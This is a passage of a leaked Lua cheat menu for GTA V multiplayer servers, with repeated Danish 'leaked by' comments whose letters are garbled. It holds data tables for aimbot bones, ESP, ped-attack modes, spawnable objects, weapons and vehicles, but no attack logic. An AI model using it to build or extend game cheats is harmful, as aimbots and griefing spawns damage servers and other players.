jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
ESPRefreshTime = 0


AimbotBoneOps = {"Head", "Chest", "Left Arm", "Right Arm", "Left Leg", "Right Leg", "Dick"}
AimbotBone = "SKEL_HEAD"


ClothingSlots = {1, 2, 3, 4, 5}


PedAttackOps = {"All Weapons", "Melee Weapons", "Pistols", "Heavy Weapons"}

PedAttackType = 1


RadiosList = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18}
RadiosListWords = {
    "Los Santos Rock Radio",
    "Non-Stop-Pop FM",
    "Radio Los Santos",
    "Channel X",
    "West Coast Talk Radio",
    "Rebel Radio",
    "Soulwax FM",
    "East Los FM",
    "West Coast Classics",
    "Blue Ark",
    "Worldwide FM",
    "FlyLo FM",
    "The Lowdown 91.1",
    "The Lab",
    "Radio Mirror Park",
    "Space 103.2",
    "Vinewood Boulevard Radio",
    "Blonded Los Santos 97.8 FM",
    --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
    "Blaine County Radio",

}


WeathersList = { 
    "CLEAR",
    "EXTRASUNNY",
    "CLOUDS",
    "OVERCAST",
    "RAIN",
    "CLEARING",
    "THUNDER",
    "SMOG",
    "FOGGY",
    "XMAS",
    "SNOWLIGHT",
    "BLIZZARD"
}


objs_tospawn = {
    "dt1_11_dt1_tower",
    "dt1_05_mission_extras",
        "prop_temp_carrier",
        "stt_prop_stunt_track_start",
        "prop_container_01a",
        "prop_contnr_pile_01a",
        "ce_xr_ctr2",
        "stt_prop_ramp_jump_xxl",
        "hei_prop_carrier_jet",
        "prop_parking_hut_2",
        "csx_seabed_rock3_",
        "db_apart_03_",
        "db_apart_09_",
        "stt_prop_stunt_tube_l",
        "stt_prop_stunt_track_dwuturn",
        "xs_prop_hamburgher_wl",
        "sr_prop_spec_tube_xxs_01a",
        --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
        "prop_air_bigradar",
        "p_tram_crash_s",
        "prop_windmill_01",
        "gr_prop_gr_bench_02b",
        "lf_house11",
        "port_xr_contpod_02",
        "prop_barriercrash_04",
        "prop_barriercrash_03",
        "prop_barriercrash_02",
        "gr_prop_gr_target_small_04a",
        "gr_prop_damship_01a",
        "gr_prop_gr_basepart_f",
        "p_oil_pjack_01_frg_s",
        "p_oil_pjack_01_amo",
    "p_oil_pjack_01_frg_s",
    "p_oil_pjack_01_s",
    "p_oil_pjack_02_amo",
    "p_oil_pjack_02_frg_s",
    "p_oil_pjack_02_s",
    "p_oil_pjack_03_amo",
    "p_oil_pjack_03_frg_s",
    "p_oil_pjack_03_s",
    "marina_xr_rocks_03",
    "marina_xr_rocks_04",
    "marina_xr_rocks_05",
    "marina_xr_rocks_06",
    "marina_xr_rocks_02",
    "lts_prop_lts_ramp_01",
    "lts_prop_lts_ramp_02",
    "lts_prop_lts_ramp_03",
    "gr_prop_gr_bench_02b",
    --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
    "gr_prop_gr_bench_03a",
    "gr_prop_gr_bench_03b",
    "gr_prop_gr_bench_04a",
    "gr_prop_gr_bench_04b",
    "gr_prop_gr_bulletscrate_01a",
    "gr_prop_gr_bunkeddoor",
    "gr_prop_gr_bunkeddoor_col",
    "gr_prop_gr_bunkeddoor_f",
    "gr_prop_gr_bunkerglass",
    "gr_prop_gr_cage_01a",
    "gr_prop_gr_campbed_01",
    "gr_prop_gr_carcreeper",
    "gr_prop_gr_chair02_ped",
    "gr_prop_gr_cnc_01a",
    "gr_prop_gr_cnc_01b",
    "gr_prop_gr_cnc_01c",
    "gr_prop_gr_console_01",
    "gr_prop_gr_crate_gun_01a",
    "gr_prop_gr_crate_mag_01a",
    "gr_prop_gr_crate_pistol_02a",
    "gr_prop_gr_crates_pistols_01a",
    "gr_prop_gr_crates_rifles_01a",
    "gr_prop_gr_crates_rifles_02a",
    "gr_prop_gr_crates_rifles_03a",
    "gr_prop_gr_crates_rifles_04a",
    "gr_prop_gr_crates_sam_01a",
    "gr_prop_gr_crates_weapon_mix_01a",
    "gr_prop_gr_crates_weapon_mix_01b",
    "gr_prop_gr_cratespile_01a",
    "gr_prop_gr_doorpart",
    "gr_prop_gr_doorpart_f",
    "gr_prop_gr_drill_01a",
    "gr_prop_gr_drill_crate_01a",
    "gr_prop_gr_drillcage_01a",
    "p_med_jet_01_s",
    "cs3_lod_4_slod2",
    "vb_lod_slod4",
    "po1_lod_slod4",
    "dt1_lod_03_04_05_11",
    "dt1_21_reflproxy",
    
}


local allweapons = {
    "WEAPON_UNARMED",

    "WEAPON_KNIFE",
    "WEAPON_KNUCKLE",
    "WEAPON_NIGHTSTICK",
    "WEAPON_HAMMER",
    "WEAPON_BAT",
    "WEAPON_GOLFCLUB",
    "WEAPON_CROWBAR",
    "WEAPON_BOTTLE",
    "WEAPON_DAGGER",
    "WEAPON_HATCHET",
    "WEAPON_MACHETE",
    "WEAPON_FLASHLIGHT",
    "WEAPON_SWITCHBLADE",
    "WEAPON_POOLCUE",
    "WEAPON_PIPEWRENCH",
    

    "WEAPON_GRENADE",
    "WEAPON_STICKYBOMB",
    "WEAPON_PROXMINE",
    "WEAPON_BZGAS",
    "WEAPON_SMOKEGRENADE",
    "WEAPON_MOLOTOV",
    "WEAPON_FIREEXTINGUISHER",
    --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
    "WEAPON_PETROLCAN",
    "WEAPON_SNOWBALL",
    "WEAPON_FLARE",
    "WEAPON_BALL",
    

    "WEAPON_PISTOL",
    "WEAPON_PISTOL_MK2",
    "WEAPON_COMBATPISTOL",
    "WEAPON_APPISTOL",
    "WEAPON_REVOLVER",
    "WEAPON_REVOLVER_MK2",
    "WEAPON_DOUBLEACTION",
    "WEAPON_PISTOL50",
    "WEAPON_SNSPISTOL",
    "WEAPON_SNSPISTOL_MK2",
    "WEAPON_HEAVYPISTOL",
    "WEAPON_VINTAGEPISTOL",
    "WEAPON_STUNGUN",
    "WEAPON_FLAREGUN",
    "WEAPON_MARKSMANPISTOL",
    "WEAPON_RAYPISTOL",
    

    "WEAPON_MICROSMG",
    "WEAPON_MINISMG",
    "WEAPON_SMG",
    "WEAPON_SMG_MK2",
    "WEAPON_ASSAULTSMG",
    "WEAPON_COMBATPDW",
    "WEAPON_GUSENBERG",
    "WEAPON_MACHINEPISTOL",
    "WEAPON_MG",
    "WEAPON_COMBATMG",
    "WEAPON_COMBATMG_MK2",
    "WEAPON_RAYCARBINE",


    "WEAPON_ASSAULTRIFLE",
    "WEAPON_ASSAULTRIFLE_MK2",
    "WEAPON_CARBINERIFLE",
    "WEAPON_CARBINERIFLE_MK2",
    "WEAPON_ADVANCEDRIFLE",
    "WEAPON_SPECIALCARBINE",
    "WEAPON_SPECIALCARBINE_MK2",
    "WEAPON_BULLPUPRIFLE",
    "WEAPON_BULLPUPRIFLE_MK2",
    "WEAPON_COMPACTRIFLE",
    

    "WEAPON_PUMPSHOTGUN",
    "WEAPON_PUMPSHOTGUN_MK2",
    "WEAPON_SWEEPERSHOTGUN",
    "WEAPON_SAWNOFFSHOTGUN",
    "WEAPON_BULLPUPSHOTGUN",
    "WEAPON_ASSAULTSHOTGUN",
    "WEAPON_MUSKET",
    "WEAPON_HEAVYSHOTGUN",
    "WEAPON_DBSHOTGUN",
    

    "WEAPON_SNIPERRIFLE",
    "WEAPON_HEAVYSNIPER",
    "WEAPON_HEAVYSNIPER_MK2",
    "WEAPON_MARKSMANRIFLE",
    "WEAPON_MARKSMANRIFLE_MK2",
    

    "WEAPON_GRENADELAUNCHER",
    "WEAPON_GRENADELAUNCHER_SMOKE",
    "WEAPON_RPG",
    "WEAPON_MINIGUN",
    "WEAPON_FIREWORK",
    "WEAPON_RAILGUN",
    "WEAPON_HOMINGLAUNCHER",
    "WEAPON_COMPACTLAUNCHER",
    "WEAPON_RAYMINIGUN",
}

local meleeweapons = {
    {"WEAPON_KNIFE", "Knife"},
    {"WEAPON_KNUCKLE", "Brass Knuckles"},
    {"WEAPON_NIGHTSTICK", "Nightstick"},
    {"WEAPON_HAMMER", "Hammer"},
    {"WEAPON_BAT", "Baseball Bat"},
    {"WEAPON_GOLFCLUB", "Golf Club"},
    {"WEAPON_CROWBAR", "Crowbar"},
    {"WEAPON_BOTTLE", "Bottle"},
    {"WEAPON_DAGGER", "Dagger"},
    {"WEAPON_HATCHET", "Hatchet"},
    {"WEAPON_MACHETE", "Machete"},
    {"WEAPON_FLASHLIGHT", "Flashlight"},
    {"WEAPON_SWITCHBLADE", "Switchblade"},
    {"WEAPON_POOLCUE", "Pool Cue"},
    {"WEAPON_PIPEWRENCH", "Pipe Wrench"}
}

local thrownweapons = {
    {"WEAPON_GRENADE", "Grenade"},
    {"WEAPON_STICKYBOMB", "Sticky Bomb"},
    {"WEAPON_PROXMINE", "Proximity Mine"},
    {"WEAPON_BZGAS", "BZ Gas"},
    {"WEAPON_SMOKEGRENADE", "Smoke Grenade"},
    {"WEAPON_MOLOTOV", "Molotov"},
    {"WEAPON_FIREEXTINGUISHER", "Fire Extinguisher"},
    {"WEAPON_PETROLCAN", "Fuel Can"},
    {"WEAPON_SNOWBALL", "Snowball"},
    {"WEAPON_FLARE", "Flare"},
    {"WEAPON_BALL", "Baseball"}
}

local pistolweapons = {
    {"WEAPON_PISTOL", "Pistol"},
    {"WEAPON_PISTOL_MK2", "Pistol Mk II"},
    {"WEAPON_COMBATPISTOL", "Combat Pistol"},
    {"WEAPON_APPISTOL", "AP Pistol"},
    {"WEAPON_REVOLVER", "Revolver"},
    {"WEAPON_REVOLVER_MK2", "Revolver Mk II"},
    {"WEAPON_DOUBLEACTION", "Double Action Revolver"},
    {"WEAPON_PISTOL50", "Pistol .50"},
    {"WEAPON_SNSPISTOL", "SNS Pistol"},
    {"WEAPON_SNSPISTOL_MK2", "SNS Pistol Mk II"},
    {"WEAPON_HEAVYPISTOL", "Heavy Pistol"},
    {"WEAPON_VINTAGEPISTOL", "Vintage Pistol"},
    {"WEAPON_STUNGUN", "Tazer"},
    {"WEAPON_FLAREGUN", "Flaregun"},
    {"WEAPON_MARKSMANPISTOL", "Marksman Pistol"},
    {"WEAPON_RAYPISTOL", "Up-n-Atomizer"}
}

local smgweapons = {
    {"WEAPON_MICROSMG", "Micro SMG"},
    {"WEAPON_MINISMG", "Mini SMG"},
    {"WEAPON_SMG", "SMG"},
    {"WEAPON_SMG_MK2", "SMG Mk II"},
    {"WEAPON_ASSAULTSMG", "Assault SMG"},
    {"WEAPON_COMBATPDW", "Combat PDW"},
    {"WEAPON_GUSENBERG", "Gunsenberg"},
    {"WEAPON_MACHINEPISTOL", "Machine Pistol"},
    {"WEAPON_MG", "MG"},
    {"WEAPON_COMBATMG", "Combat MG"},
    {"WEAPON_COMBATMG_MK2", "Combat MG Mk II"},
    {"WEAPON_RAYCARBINE", "Unholy Hellbringer"}
}

local assaultweapons = {
    {"WEAPON_ASSAULTRIFLE", "Assault Rifle"},
    {"WEAPON_ASSAULTRIFLE_MK2", "Assault Rifle Mk II"},
    {"WEAPON_CARBINERIFLE", "Carbine Rifle"},
    {"WEAPON_CARBINERIFLE_MK2", "Carbine Rigle Mk II"},
    {"WEAPON_ADVANCEDRIFLE", "Advanced Rifle"},
    {"WEAPON_SPECIALCARBINE", "Special Carbine"},
    {"WEAPON_SPECIALCARBINE_MK2", "Special Carbine Mk II"},
    {"WEAPON_BULLPUPRIFLE", "Bullpup Rifle"},
    {"WEAPON_BULLPUPRIFLE_MK2", "Bullpup Rifle Mk II"},
    {"WEAPON_COMPACTRIFLE", "Compact Rifle"}
}

local shotgunweapons = {
    {"WEAPON_PUMPSHOTGUN", "Pump Shotgun"},
    {"WEAPON_PUMPSHOTGUN_MK2", "Pump Shotgun Mk II"},
    {"WEAPON_SWEEPERSHOTGUN", "Sweeper Shotgun"},
    {"WEAPON_SAWNOFFSHOTGUN", "Sawed-Off Shotgun"},
    {"WEAPON_BULLPUPSHOTGUN", "Bullpup Shotgun"},
    {"WEAPON_ASSAULTSHOTGUN", "Assault Shotgun"},
    {"WEAPON_MUSKET", "Musket"},
    {"WEAPON_HEAVYSHOTGUN", "Heavy Shotgun"},
    {"WEAPON_DBSHOTGUN", "Double Barrel Shotgun"}
}

local sniperweapons = {
    {"WEAPON_SNIPERRIFLE", "Sniper Rifle"},
    {"WEAPON_HEAVYSNIPER", "Heavy Sniper"},
    {"WEAPON_HEAVYSNIPER_MK2", "Heavy Sniper Mk II"},
    {"WEAPON_MARKSMANRIFLE", "Marksman Rifle"},
    {"WEAPON_MARKSMANRIFLE_MK2", "Marksman Rifle Mk II"}
}

local heavyweapons = {
    {"WEAPON_GRENADELAUNCHER", "Grenade Launcher"},
    {"WEAPON_RPG", "RPG"},
    {"WEAPON_MINIGUN", "Minigun"},
    {"WEAPON_FIREWORK", "Firework Launcher"},
    {"WEAPON_RAILGUN", "Railgun"},
    {"WEAPON_HOMINGLAUNCHER", "Homing Launcher"},
    {"WEAPON_COMPACTLAUNCHER", "Compact Grenade Launcher"},
    {"WEAPON_RAYMINIGUN", "Widowmaker"}
}

local compacts = {
    "BLISTA",
    "BRIOSO",
    "DILETTANTE",
    "DILETTANTE2",
    "ISSI2",
    "ISSI3",
    "ISSI4",
    "ISSI5",
    "ISSI6",
    "PANTO",
    "PRAIRIE",
    "RHAPSODY"
}

local sedans = {
    "ASEA",
    "ASEA2",
    "ASTEROPE",
    "COG55",
    "COG552",
    "COGNOSCENTI",
    "COGNOSCENTI2",
    "EMPEROR",
    "EMPEROR2",
    "EMPEROR3",
    "FUGITIVE",
    "GLENDALE",
    "INGOT",
    "INTRUDER",
    "LIMO2",
    "PREMIER",
    "PRIMO",
    "PRIMO2",
    "REGINA",
    "ROMERO",
    "SCHAFTER2",
    "SCHAFTER5",
    "SCHAFTER6",
    "STAFFORD",
    "STANIER",
    "STRATUM",
    "STRETCH",
    "SUPERD",
    "SURGE",
    "TAILGATER",
    "WARRENER",
    "WASHINGTON"
}

local suvs = {
    "BALLER",
    "BALLER2",
    "BALLER3",
    "BALLER4",
    "BALLER5",
    "BALLER6",
    "BJXL",
    "CAVALCADE",
    "CAVALCADE2",
    "CONTENDER",
    "DUBSTA",
    "DUBSTA2",
    "FQ2",
    "GRANGER",
    "GRESLEY",
    "HABANERO",
    "HUNTLEY",
    "LANDSTALKER",
    "MESA",
    "MESA2",
    "PATRIOT",
    "PATRIOT2",
    "RADI",
    "ROCOTO",
    "SEMINOLE",
    "SERRANO",
    "TOROS",
    "XLS",
    "XLS2"
}

local coupes = {
    "COGCABRIO",
    "EXEMPLAR",
    "F620",
    "FELON",
    "FELON2",
    "JACKAL",
    "ORACLE",
    "ORACLE2",
    "SENTINEL",
    "SENTINEL2",
    "WINDSOR",
    "WINDSOR2",
    "ZION",
    "ZION2"
}

local muscle = {
    "BLADE",
    "BUCCANEER",
    "BUCCANEER2",
    "CHINO",
    "CHINO2",
    "CLIQUE",
    "COQUETTE3",
    "DEVIANT",
    "DOMINATOR",
    "DOMINATOR2",
    "DOMINATOR3",
    "DOMINATOR4",
    "DOMINATOR5",
    "DOMINATOR6",
    "DUKES",
    "DUKES2",
    "ELLIE",
    "FACTION",
    "FACTION2",
    "FACTION3",
    "GAUNTLET",
    "GAUNTLET2",
    "HERMES",
    "HOTKNIFE",
    "HUSTLER",
    "IMPALER",
    "IMPALER2",
    "IMPALER3",
    "IMPALER4",
    "IMPERATOR",
    "IMPERATOR2",
    "IMPERATOR3",
    "LURCHER",
    "MOONBEAM",
    "MOONBEAM2",
    "NIGHTSHADE",
    "PHOENIX",
    "PICADOR",
    "RATLOADER",
    "RATLOADER2",
    "RUINER",
    "RUINER2",
    "RUINER3",
    "SABREGT",
    "SABREGT2",
    "SLAMVAN",
    "SLAMVAN2",
    "SLAMVAN3",
    "SLAMVAN4",
    "SLAMVAN5",
    "SLAMVAN6",
    "STALION",
    "STALION2",
    "TAMPA",
    "TAMPA3",
    "TULIP",
    "VAMOS",
    "VIGERO",
    "VIRGO",
    "VIRGO2",
    "VIRGO3",
    "VOODOO",
    "VOODOO2",
    "YOSEMITE"
}

local sportsclassics = {
    "ARDENT",
    "BTYPE",
    "BTYPE2",
    "BTYPE3",
    "CASCO",
    "CHEBUREK",
    "CHEETAH2",
    "COQUETTE2",
    "DELUXO",
    "FAGALOA",
    "FELTZER3",
    "GT500",
    "INFERNUS2",
    "JB700",
    "JESTER3",
    "MAMBA",
    "MANANA",
    "MICHELLI",
    "MONROE",
    "PEYOTE",
    "PIGALLE",
    "RAPIDGT3",
    "RETINUE",
    "SAVESTRA",
    "STINGER",
    "STINGERGT",
    "STROMBERG",
    "SWINGER",
    "TORERO",
    "TORNADO",
    "TORNADO2",
    "TORNADO3",
    "TORNADO4",
    "TORNADO5",
    "TORNADO6",
    "TURISMO2",
    "VISERIS",
    "Z190",
    "ZTYPE"
}

local sports = {
    "ALPHA",
    "BANSHEE",
    "BESTIAGTS",
    "BLISTA2",
    "BLISTA3",
    "BUFFALO",
    "BUFFALO2",
    "BUFFALO3",
    "CARBONIZZARE",
    "COMET2",
    "COMET3",
    "COMET4",
    "COMET5",
    "COQUETTE",
    "ELEGY",
    "ELEGY2",
    "FELTZER2",
    "FLASHGT",
    "FUROREGT",
    "FUSILADE",
    "FUTO",
    "GB200",
    "HOTRING",
    "ITALIGTO",
    "JESTER",
    "JESTER2",
    "KHAMELION",
    "KURUMA",
    "KURUMA2",
    "LYNX",
    "MASSACRO",
    "MASSACRO2",
    "NEON",
    "NINEF",
    "NINEF2",
    "OMNIS",
    "PARIAH",
    "PENUMBRA",
    "RAIDEN",
    "RAPIDGT",
    "RAPIDGT2",
    "RAPTOR",
    "REVOLTER",
    "RUSTON",
    "SCHAFTER2",
    "SCHAFTER3",
    "SCHAFTER4",
    "SCHAFTER5",
    "SCHLAGEN",
    "SCHWARZER",
    "SENTINEL3",
    "SEVEN70",
    "SPECTER",
    "SPECTER2",
    "SULTAN",
    "SURANO",
    "TAMPA2",
    "TROPOS",
    "VERLIERER2",
    "ZR380",
    "ZR3802",
    "ZR3803"
}

local super = {
    "ADDER",
    "AUTARCH",
    "BANSHEE2",
    "BULLET",
    "CHEETAH",
    "CYCLONE",
    "DEVESTE",
    "ENTITYXF",
    "ENTITY2",
    "FMJ",
    "GP1",
    "INFERNUS",
    "ITALIGTB",
    "ITALIGTB2",
    "LE7B",
    "NERO",
    "NERO2",
    "OSIRIS",
    "PENETRATOR",
    "PFISTER811",
    "PROTOTIPO",
    "REAPER",
    "SC1",
    "SCRAMJET",
    "SHEAVA",
    "SULTANRS",
    "T20",
    "TAIPAN",
    "TEMPESTA",
    "TEZERACT",
    "TURISMOR",
    "TYRANT",
    "TYRUS",
    "VACCA",
    "VAGNER",
    "VIGILANTE",
    "VISIONE",
    "VOLTIC",
    "VOLTIC2",
    "XA21",
    "ZENTORNO"
}

local motorcycles = {
    "AKUMA",
    "AVARUS",
    "BAGGER",
    "BATI",
    "BATI2",
    "BF400",
    "CARBONRS",
    "CHIMERA",
    "CLIFFHANGER",
    "DAEMON",
    "DAEMON2",
    "DEFILER",
    "DEATHBIKE",
    "DEATHBIKE2",
    "DEATHBIKE3",
    "DIABLOUS",
    "DIABLOUS2",
    "DOUBLE",
    "ENDURO",
    "ESSKEY",
    "FAGGIO",
    "FAGGIO2",
    "FAGGIO3",
    "FCR",
    "FCR2",
    "GARGOYLE",
    "HAKUCHOU",
    "HAKUCHOU2",
    "HEXER",
    "INNOVATION",
    "LECTRO",
    "MANCHEZ",
    "NEMESIS",
    "NIGHTBLADE",
    "OPPRESSOR",
    "OPPRESSOR2",
    "PCJ",
    "RATBIKE",
    "RUFFIAN",
    "SANCHEZ",
    "SANCHEZ2",
    "SANCTUS",
    "SHOTARO",
    "SOVEREIGN",
    "THRUST",
    "VADER",
    "VINDICATOR",
    "VORTEX",
    "WOLFSBANE",
    "ZOMBIEA",
    "ZOMBIEB"
}

local offroad = {
    "BFINJECTION",
    "BIFTA",
    "BLAZER",
    "BLAZER2",
    "BLAZER3",
    "BLAZER4",
    "BLAZER5",
    "BODHI2",
    "BRAWLER",
    "BRUISER",
    "BRUISER2",
    "BRUISER3",
    "BRUTUS",
    "BRUTUS2",
    "BRUTUS3",
    "CARACARA",
    "DLOADER",
    "DUBSTA3",
    "DUNE",
    "DUNE2",
    "DUNE3",
    "DUNE4",
    "DUNE5",
    "FREECRAWLER",
    "INSURGENT",
    "INSURGENT2",
    "INSURGENT3",
    "KALAHARI",
    "KAMACHO",
    "MARSHALL",
    "MENACER",
    "MESA3",
    "MONSTER",
    "MONSTER3",
    "MONSTER4",
    "MONSTER5",
    "NIGHTSHARK",
    "RANCHERXL",
    "RANCHERXL2",
    "RCBANDITO",
    "REBEL",
    "REBEL2",
    "RIATA",
    "SANDKING",
    "SANDKING2",
    "TECHNICAL",
    "TECHNICAL2",
    "TECHNICAL3",
    "TROPHYTRUCK",
    "TROPHYTRUCK2"
}

local industrial = {
    "BULLDOZER",
    "CUTTER",
    "DUMP",
    "FLATBED",
    "GUARDIAN",
    "HANDLER",
    "MIXER",
    "MIXER2",
    "RUBBLE",
    "TIPTRUCK",
    "TIPTRUCK2"
}

local utility = {
    "AIRTUG",
    "CADDY",
    "CADDY2",
    "CADDY3",
    "DOCKTUG",
    "FORKLIFT",
    "TRACTOR2",
    "TRACTOR3",
    "MOWER",
    "RIPLEY",
    "SADLER",
    "SADLER2",
    "SCRAP",
    "TOWTRUCK",
    "TOWTRUCK2",
    "TRACTOR",
    "UTILLITRUCK",
    "UTILLITRUCK2",
    "UTILLITRUCK3",
    "ARMYTRAILER",
    "ARMYTRAILER2",
    "FREIGHTTRAILER",
    "ARMYTANKER",
    "TRAILERLARGE",
    "DOCKTRAILER",
    "TR3",
    "TR2",
    "TR4",
    "TRFLAT",
    "TRAILERS",
    "TRAILERS4",
    "TRAILERS2",
    "TRAILERS3",
    "TVTRAILER",
    "TRAILERLOGS",
    "TANKER",
    "TANKER2",
    "BALETRAILER",
    "GRAINTRAILER",
    "BOATTRAILER",
    "RAKETRAILER",
    "TRAILERSMALL"
}

local vans = {
    "BISON",
    "BISON2",
    "BISON3",
    "BOBCATXL",
    "BOXVILLE",
    "BOXVILLE2",
    "BOXVILLE3",
    "BOXVILLE4",
    "BOXVILLE5",
    "BURRITO",
    "BURRITO2",
    "BURRITO3",
    "BURRITO4",
    "BURRITO5",
    "CAMPER",
    "GBURRITO",
    "GBURRITO2",
    "JOURNEY",
    "MINIVAN",
    "MINIVAN2",
    "PARADISE",
    "PONY",
    "PONY2",
    "RUMPO",
    "RUMPO2",
    "RUMPO3",
    "SPEEDO",
    "SPEEDO2",
    "SPEEDO4",
    "SURFER",
    "SURFER2",
    "TACO",
    "YOUGA",
    "YOUGA2"
}

local cycles = {
    "BMX",
    "CRUISER",
    "FIXTER",
    "SCORCHER",
    "TRIBIKE",
    "TRIBIKE2",
    "TRIBIKE3"
}

local boats = {
    "DINGHY",
    "DINGHY2",
    "DINGHY3",
    "DINGHY4",
    "JETMAX",
    "MARQUIS",
    "PREDATOR",
    "SEASHARK",
    "SEASHARK2",
    "SEASHARK3",
    "SPEEDER",
    "SPEEDER2",
    "SQUALO",
    "SUBMERSIBLE",
    "SUBMERSIBLE2",
    "SUNTRAP",
    "TORO",
    "TORO2",
    "TROPIC",
    "TROPIC2",
    "TUG"
}

local helicopters = {
    "AKULA",
    "ANNIHILATOR",
    "BUZZARD",
    "BUZZARD2",
    "CARGOBOB",
    "CARGOBOB2",
    "CARGOBOB3",
    "CARGOBOB4",
    "FROGGER",
    "FROGGER2",
    "HAVOK",
    "HUNTER",
    "MAVERICK",
    "POLMAV",
    "SAVAGE",
    "SEASPARROW",
    "SKYLIFT",
    "SUPERVOLITO",
    "SUPERVOLITO2",
    "SWIFT",
    "SWIFT2",
    "VALKYRIE",
    "VALKYRIE2",
    "VOLATUS"
}


local planes = {
    "ALPHAZ1",
    "AVENGER",
    "AVENGER2",
    "BESRA",
    "BLIMP",
    "BLIMP2",
    "BLIMP3",
    "BOMBUSHKA",
    "CARGOPLANE",
    "CUBAN800",
    "DODO",
    "DUSTER",
    "HOWARD",
    "HYDRA",
    "JET",
    "LAZER",
    "LUXOR",
    "LUXOR2",
    "MAMMATUS",
    "MICROLIGHT",
    "MILJET",
    "MOGUL",
    "MOLOTOK",
    "NIMBUS",
    "NOKOTA",
    "PYRO",
    "ROGUE",
    "SEABREEZE",
    "SHAMAL",
    "STARLING",
    "STRIKEFORCE",
    "STUNT",
    "TITAN",
    "TULA",
    "VELUM",
    "VELUM2",
    "VESTRA",
    "VOLATOL"
}

local service = {
    "AIRBUS",
    "BRICKADE",
    "BUS",
    "COACH",
    "PBUS2",
    "RALLYTRUCK",
    "RENTALBUS",
    "TAXI",
    "TOURBUS",
    "TRASH",
    "TRASH2",
    "WASTELANDER",
    "AMBULANCE",
    "FBI",
    "FBI2",
    "FIRETRUK",
    "LGUARD",
    "PBUS",
    "POLICE",
    "POLICE2",
    "POLICE3",
    "POLICE4",
    "POLICEB",
    "POLICEOLD1",
    "POLICEOLD2",
    "POLICET",
    "POLMAV",
    "PRANGER",
    "PREDATOR",
    "RIOT",
    "RIOT2",
    "SHERIFF",
    "SHERIFF2",
    "APC",
    "BARRACKS",
    "BARRACKS2",
    "BARRACKS3",
    "BARRAGE",
    "CHERNOBOG",
    "CRUSADER",
    "HALFTRACK",
    "KHANJALI",
    "RHINO",
    "SCARAB",
    "SCARAB2",
    "SCARAB3",
    "THRUSTER",
    "TRAILERSMALL2"
}

local commercial = {
    "BENSON",
    "BIFF",
    "CERBERUS",
    "CERBERUS2",
    "CERBERUS3",
    "HAULER",
    "HAULER2",
    "MULE",
    "MULE2",
    "MULE3",
    "MULE4",
    "PACKER",
    "PHANTOM",
    "PHANTOM2",
    "PHANTOM3",
    "POUNDER",
    "POUNDER2",
    "STOCKADE",
    "STOCKADE3",
    "TERBYTE",
    "CABLECAR",
    "FREIGHT",
    "FREIGHTCAR",
    "FREIGHTCONT1",
    "FREIGHTCONT2",
    "FREIGHTGRAIN",
    "METROTRAIN",
    "TANKERCAR"
}


local classicColors = {
    {"Black", 0},
    {"Carbon Black", 147},
    {"Graphite", 1},
    {"Anhracite Black", 11},
    {"Black Steel", 2},
    {"Dark Steel", 3},
    {"Silver", 4},
    {"Bluish Silver", 5},
    {"Rolled Steel", 6},
    {"Shadow Silver", 7},
    {"Stone Silver", 8},
    {"Midnight Silver", 9},
    {"Cast Iron Silver", 10},
    {"Red", 27},
    {"Torino Red", 28},
    {"Formula Red", 29},
    {"Lava Red", 150},
    {"Blaze Red", 30},
    {"Grace Red", 31},
    {"Garnet Red", 32},
    {"Sunset Red", 33},
    {"Cabernet Red", 34},
    {"Wine Red", 143},
    {"Candy Red", 35},
    {"Hot Pink", 135},
    {"Pfsiter Pink", 137},
    {"Salmon Pink", 136},
    {"Sunrise Orange", 36},
    {"Orange", 38},
    {"Bright Orange", 138},
    {"Gold", 99},
    {"Bronze", 90},
    {"Yellow", 88},
    {"Race Yellow", 89},
    {"Dew Yellow", 91},
    {"Dark Green", 49},
    {"Racing Green", 50},
    {"Sea Green", 51},
    {"Olive Green", 52},
    {"Bright Green", 53},
    {"Gasoline Green", 54},
    {"Lime Green", 92},
    {"Midnight Blue", 141},
    {"Galaxy Blue", 61},
    {"Dark Blue", 62},
    {"Saxon Blue", 63},
    {"Blue", 64},
    {"Mariner Blue", 65},
    {"Harbor Blue", 66},
    {"Diamond Blue", 67},
    {"Surf Blue", 68},
    {"Nautical Blue", 69},
    {"Racing Blue", 73},
    {"Ultra Blue", 70},
    {"Light Blue", 74},
    {"Chocolate Brown", 96},
    {"Bison Brown", 101},
    {"Creeen Brown", 95},
    {"Feltzer Brown", 94},
    {"Maple Brown", 97},
    {"Beechwood Brown", 103},
    {"Sienna Brown", 104},
    {"Saddle Brown", 98},
    {"Moss Brown", 100},
    {"Woodbeech Brown", 102},
    {"Straw Brown", 99},
    {"Sandy Brown", 105},
    {"Bleached Brown", 106},
    {"Schafter Purple", 71},
    {"Spinnaker Purple", 72},
    {"Midnight Purple", 142},
    {"Bright Purple", 145},
    {"Cream", 107},
    {"Ice White", 111},
    {"Frost White", 112}
}

local matteColors = {
    {"Black", 12},
    {"Gray", 13},
